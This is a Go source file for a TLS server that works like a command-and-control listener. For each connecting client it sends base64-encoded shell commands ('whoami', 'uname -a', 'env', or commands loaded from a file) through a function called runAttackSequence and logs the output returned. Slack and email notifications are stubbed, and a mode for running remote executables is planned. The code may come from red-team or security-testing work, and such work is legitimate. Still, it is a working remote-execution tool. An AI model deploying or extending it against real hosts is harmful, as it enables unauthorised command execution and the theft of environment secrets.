package main

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"net/mail"
	"os"
	"os/exec"
	"strings"
	"time"
	"github.com/joho/godotenv"
	"github.com/slack-go/slack"
)

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func validateMailAddress(address string) bool {
	_, err := mail.ParseAddress(address)
	if err != nil {
		fmt.Println("Invalid Email Address")
		os.Exit(1)
	}
	return true
}

//file upl/downl functions, if needed
func uploadFile(conn net.Conn, path string) {
	// open file to upload
	fi, err := os.Open(path)
	handleError(err)
	defer fi.Close()
	// upload
	_, err = io.Copy(conn, fi)
	handleError(err)
}

func downloadFile(conn net.Conn, path string) {
	// create new file to hold response
	fo, err := os.Create(path)
	handleError(err)
	defer fo.Close()

	handleError(err)
	defer conn.Close()

	_, err = io.Copy(fo, conn)
	handleError(err)
}

func sendEmail(enable bool, email string, conn net.Conn) { 
	if !enable {
		return
	}
}

func sendSlackMessage(enable bool, CHANNEL_ID string, MESSAGE string, conn net.Conn) bool { //use ind 4
	if !enable {
		return false
	}

	api := slack.New(os.Getenv("SLACK_BOT_TOKEN")) //Soham - SLACK BOT TOKEN NOT YET GENERATED.

	channelID, timestamp, err := api.PostMessage(
		CHANNEL_ID,
		slack.MsgOptionText(MESSAGE, false),
	)

	if err != nil {
		fmt.Printf("%s\n", err)
		return false
	}
	fmt.Printf("Message successfully sent to channel %s at %s", channelID, timestamp)
	return true
}

func genCert(email string) string {
	cmd, err := exec.Command("bash", "./certGen.sh", email).Output()

	if err != nil {
		fmt.Printf("Error generating SSL Certificate: %s\n", err)
		os.Exit(1)
	}
	outstr := string(cmd)
	return outstr
}

func readFile(filePathName string) ([]string, int) {
	file, err := os.Open(filePathName)
	if err != nil {
		fmt.Println("Failed to open file.")
		os.Exit(1)
	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var text []string

	for scanner.Scan() {
		text = append(text, scanner.Text())
	}
	file.Close()
	return text, len(text)

}

func handleClient(conn net.Conn, l net.Listener, cmdsToRun []string) {
	os.Mkdir("./logs/", os.ModePerm)

	file, err := os.OpenFile("./logs/"+conn.RemoteAddr().String()+"-"+time.Now().Format(time.RFC1123)+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	logger := log.New(file, "", log.LstdFlags)
	logger.Println("FILE BEGINS HERE.")
	logger.Println("Client connected: ", conn.RemoteAddr())
	runAttackSequence(conn, logger, cmdsToRun)
	disconnectClient(conn, logger, *file)
}

func setReadDeadLine(conn net.Conn) {
	err := conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	if err != nil {
		log.Println("SetReadDeadline failed:", err)
	}
}

func setWriteDeadLine(conn net.Conn) {
	err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if err != nil {
		log.Println("SetWriteDeadline failed:", err)
	}
}

func checkEnableFlags(arguments []string, len int, cIndex int) (bool, bool) {
	switch len {
	case cIndex:
		fmt.Println("No enable flags provided. No notifications enabled.")
		return false, false

	case cIndex + 1:
		if arguments[cIndex] == "-e" {
			fmt.Println("Only email notifications enabled.")
			return true, false
		} else if arguments[cIndex] == "-es" || arguments[cIndex] == "-se" {
			fmt.Println("Both Email and Slack notifications enabled.")
			return true, true
		} else if arguments[cIndex] == "-s" {
			fmt.Println("Only Slack notifications enabled.")
			return false, true
		} else {
			fmt.Println("Wrong enable flag provided. Please use the following list of commands to enable notifications:")
			printFlagHelp()
			os.Exit(1)
		}
	}
	return false, false
}

func printFlagHelp() {
	fmt.Println("'-e' : To enable only Email notifications.")
	fmt.Println("'-s' : To enable only Email notifications.")
	fmt.Println("'-es' or '-se' : To enable both Email and Slack notifications.")
	fmt.Println("To disable notifications, skip the enable flag.")
}
func checkFlags(arguments []string, l int, cmdsToRun []string) ([]string, bool, bool) {
	switch arguments[1] {
	case "-a": //run sample commands -> echo $ARAALI_COUNT", "uname -a", "whoami", "pwd", "env"
		//cindex 2
		fmt.Println("Running default commands", cmdsToRun)
		emailEN, slackEN := checkEnableFlags(arguments, len(arguments), 2)
		return cmdsToRun, emailEN, slackEN
	case "-fe": //run commands from file
		if l < 3 {
			fmt.Println("No filename specified.")
			os.Exit(1)
		}

		//check if filepath exists
		if _, err := os.Stat(arguments[2]); err == nil {
			fmt.Printf("File exists. Executing commands from file.\n")
		} else {
			fmt.Printf("File does not exist\n")
			os.Exit(1)
		}
		cmdsToRun, _ = readFile(arguments[2])
		//cindex 3
		emailEN, slackEN := checkEnableFlags(arguments, len(arguments), 3)
		return cmdsToRun, emailEN, slackEN

	//***************************************************//
	// case "-fue" yet to be implemented//
	//***************************************************//
	case "-fu":
		os.Exit(12) //COMMENT OR DELETE AFTER CASE "-fu" is implemented correctly, this line is to prevent accidentally using this
		//mode
		if l != 3 {
			fmt.Println("No filename specified.")
			os.Exit(1)
		}
		//check if filepath exists
		if _, err := os.Stat(arguments[2]); err != nil {
			fmt.Printf("Filepath does not exist\n")
			os.Exit(1)
		}
		return []string{}, false, false //for now, until "-fu" implementation is complete
	default:
		fmt.Printf("'%s' is not a listed command, please choose from the following: \n", arguments[1])
		fmt.Println("-a : Run \"echo $ARAALI_COUNT\", \"uname -a\", \"whoami\", \"pwd\", \"env\"")
		fmt.Println("-fe : Run commands from a file specified as argument 3")
		fmt.Println("-fue : Run an executable file on the client system, specified as argument 3")
		fmt.Println("Please use the following list of commands to enable notifications:")
		printFlagHelp()
		os.Exit(1)
	}
	return []string{}, false, false
}

func runAttackSequence(conn net.Conn, logger *log.Logger, cmdsToRun []string) {

	buffer := make([]byte, 1024)
	for _, element := range cmdsToRun {
		element = strings.TrimSpace(element)
		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
		logger.Println("EXECUTE: " + element)
		setWriteDeadLine(conn)
		_, err := conn.Write([]byte(encodedStr))
		if err != nil {
			return
		}
		time.Sleep(time.Second * 2)
		setReadDeadLine(conn)
		_, err = conn.Read(buffer)
		if err != nil {
			return
		}
		decodedStr, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
		logger.Println("RES: " + string(decodedStr[:]))
	}
	logger.Println("\nDONE.\nFILE ENDS HERE.")
}

func disconnectClient(conn net.Conn, logger *log.Logger, file os.File) {
	logger.Println("Disconnecting Client: ", strings.Split(conn.RemoteAddr().String(), ":")[0])
	file.Close()
	conn.Close()
}
func main() {
	err := godotenv.Load()
	if err != nil {
		fmt.Println("Could not open .env file.")
		os.Exit(1)
	}
	cmdsToRun := []string{"ls", "uname -a", "whoami", "pwd", "env"}
	MESSAGE := os.Getenv("MESSAGE")       //These two fields need to be added
	CHANNEL_ID := os.Getenv("CHANNEL_ID") //These two fields need to be added
	EMAILID := os.Getenv("EMAIL_ID")
	PORT := os.Getenv("PORT")
	genCert(os.Getenv("SSLCERTGENEMAIL_SERVER")) //to generate SSL certificate

	arguments := os.Args
	cmdsToRun, _, _ = checkFlags(arguments, len(arguments), cmdsToRun) //emailEN and slackEN values are ignored

	cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
	if err != nil {
		log.Fatalf("server: loadkeys: %s", err)
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}}
	config.Rand = rand.Reader
	service := "0.0.0.0:" + PORT

	listener, err := tls.Listen("tcp", service, &config)
	if err != nil {
		log.Fatalf("Server Listen: %s", err)
	}
	fmt.Println("Server Listening on port: ", PORT)
	for {
		conn, err := listener.Accept()

		if err != nil {
			log.Printf("Client accept error: %s", err)
			continue
		}

		sendEmail(false, EMAILID, conn) //"false" hardcoded as notifications are not yet implemented
		sendSlackMessage(false, CHANNEL_ID, MESSAGE, conn) //"false" hardcoded as notifications are not yet implemented

		log.Printf("Client accepted: %s", conn.RemoteAddr())
		tlscon, ok := conn.(*tls.Conn)
		if ok {
			log.Print("ok=true")
			state := tlscon.ConnectionState()
			for _, v := range state.PeerCertificates {
				log.Print(x509.MarshalPKIXPublicKey(v.PublicKey))
			}
		}
		go handleClient(conn, listener, cmdsToRun)
	}
}
